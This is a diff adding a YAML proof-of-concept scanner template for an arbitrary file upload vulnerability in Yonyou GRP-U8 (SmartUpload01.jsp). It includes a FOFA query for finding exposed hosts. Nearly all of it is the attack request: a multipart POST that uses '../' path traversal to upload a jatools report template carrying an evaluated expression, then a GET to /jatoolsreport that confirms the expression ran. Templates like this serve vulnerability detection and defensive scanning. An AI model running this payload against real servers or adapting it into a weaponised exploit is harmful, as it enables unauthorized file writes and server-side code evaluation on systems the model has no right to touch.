@@ -1,0 +1,414 @@
+id: poc-yaml-yongyou-grp-u8-smartupload01-anyfile-upload
+info:
+  name: 用友GRP-U8 SmartUpload01 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友 移动管理系统
+  fofa: app=“用友-GRP-U8”
+variables:
+  random_name: random_str(20)
+  content: random_str(32)
+requests:
+- method: POST
+  path: /u8qx/SmartUpload01.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryosqexjih
+  data: '------WebKitFormBoundaryosqexjih
+
+    Content-Disposition: form-data; name="uname"
+
+
+    ../../../../../../../../../{{.random_name}}
+
+    ------WebKitFormBoundaryosqexjih
+
+    Content-Disposition: form-data; name="input_localfile"; filename="{{.random_name}}.pdf"
+
+
+    <jatools Class="jatools.ReportDocument" Name="jatools report template">
+
+    <VariableContext>
+
+    </VariableContext>
+
+    <Page>
+
+    <Name>panel</Name>
+
+    <Children ItemClass="PagePanel">
+
+    <Item0>
+
+    <Name>header</Name>
+
+    <Width>753</Width>
+
+    <Height>80</Height>
+
+    <Children ItemClass="Label">
+
+    <Item0>
+
+    <Text>用一个Student对象,和其getMembers()方法,作成一个嵌套的表格dlvmwt</Text>
+
+    <ForeColor>-65536</ForeColor>
+
+    <X>41</X>
+
+    <Y>15</Y>
+
+    <Width>362</Width>
+
+    <Height>62</Height>
+
+    </Item0>
+
+    </Children>
+
+    <Type>100</Type>
+
+    </Item0>
+
+    <Item1>
+
+    <Name>footer</Name>
+
+    <Y>802</Y>
+
+    <Width>753</Width>
+
+    <Height>280</Height>
+
+    <Type>103</Type>
+
+    </Item1>
+
+    <Item2>
+
+    <Name>body</Name>
+
+    <Y>80</Y>
+
+    <Width>753</Width>
+
+    <Height>722</Height>
+
+    <Children ItemClass="Table">
+
+    <Item0>
+
+    <NodePath>学生表</NodePath>
+
+    <X>115</X>
+
+    <Y>77</Y>
+
+    <Children>
+
+    <Item0 Class="Label">
+
+    <Text>家庭成员</Text>
+
+    <Border/>
+
+    <PrintStyle>united-level:1;</PrintStyle>
+
+    <Cell>
+
+    <Row>3</Row>
+
+    <Col>0</Col>
+
+    <RowSpan>2</RowSpan>
+
+    </Cell>
+
+    </Item0>
+
+    <Item1 Class="Label">
+
+    <Text>关系</Text>
+
+    <BackColor>-4144897</BackColor>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>3</Row>
+
+    <Col>1</Col>
+
+    </Cell>
+
+    </Item1>
+
+    <Item2 Class="Label">
+
+    <Text>性别</Text>
+
+    <BackColor>-4144897</BackColor>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>3</Row>
+
+    <Col>2</Col>
+
+    </Cell>
+
+    </Item2>
+
+    <Item3 Class="Label">
+
+    <Text>年龄</Text>
+
+    <BackColor>-4144897</BackColor>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>3</Row>
+
+    <Col>3</Col>
+
+    </Cell>
+
+    </Item3>
+
+    <Item4 Class="Label">
+
+    <Text>得分</Text>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>2</Row>
+
+    <Col>0</Col>
+
+    </Cell>
+
+    </Item4>
+
+    <Item5 Class="Label">
+
+    <Text>性别</Text>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>1</Row>
+
+    <Col>0</Col>
+
+    </Cell>
+
+    </Item5>
+
+    <Item6 Class="Label">
+
+    <Text>姓名</Text>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>0</Row>
+
+    <Col>0</Col>
+
+    </Cell>
+
+    </Item6>
+
+    <Item7 Class="Text">
+
+    <Variable>=$学生表</Variable>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>0</Row>
+
+    <Col>1</Col>
+
+    <ColSpan>3</ColSpan>
+
+    </Cell>
+
+    </Item7>
+
+    <Item8 Class="Text">
+
+    <Variable>=$学生表.value()</Variable>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>1</Row>
+
+    <Col>1</Col>
+
+    <ColSpan>3</ColSpan>
+
+    </Cell>
+
+    </Item8>
+
+    <Item9 Class="Text">
+
+    <Variable>=$学生表.getName()</Variable>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>2</Row>
+
+    <Col>1</Col>
+
+    <ColSpan>3</ColSpan>
+
+    </Cell>
+
+    </Item9>
+
+    <Item10 Class="RowPanel">
+
+    <Cell>
+
+    <Row>4</Row>
+
+    <Col>0</Col>
+
+    <ColSpan>4</ColSpan>
+
+    </Cell>
+
+    <Children ItemClass="Text">
+
+    <Item0> <Variable></Variable>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>4</Row>
+
+    <Col>3</Col>
+
+    </Cell>
+
+    </Item0>
+
+    <Item1>
+
+    <Variable></Variable>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>4</Row>
+
+    <Col>2</Col>
+
+    </Cell>
+
+    </Item1>
+
+    <Item2>
+
+    <Variable>;</Variable>
+
+    <Border/>
+
+    <Cell>
+
+    <Row>4</Row>
+
+    <Col>1</Col>
+
+    </Cell>
+
+    </Item2>
+
+    </Children>
+
+    <NodePath>成员</NodePath>
+
+    </Item10>
+
+    </Children>
+
+    <ColumnWidths>60,60,60,60</ColumnWidths>
+
+    <RowHeights>20,20,20,20,20</RowHeights>
+
+    </Item0>
+
+    </Children>
+
+    <Type>102</Type>
+
+    </Item2>
+
+    </Children>
+
+    </Page>
+
+    <NodeSource>
+
+    <Children ItemClass="ArrayNodeSource">
+
+    <Item0>
+
+    <Children ItemClass="ArrayNodeSource">
+
+    <Item0>
+
+    <TagName>成员</TagName>
+
+    <Expression>$.value()</Expression>
+
+    </Item0>
+
+    </Children>
+
+    <TagName>学生表</TagName>
+
+    <Expression>new Object[]{"{{.content}}"}</Expression>
+
+    </Item0>
+
+    </Children>
+
+    </NodeSource>
+
+    </jatools>
+
+    ------WebKitFormBoundaryosqexjih--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"SmartUpload") &&
+
+    contains(body,".pdf")
+
+    '
+- method: GET
+  path: /jatoolsreport?as=dhtml&file=/{{.random_name}}.pdf
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
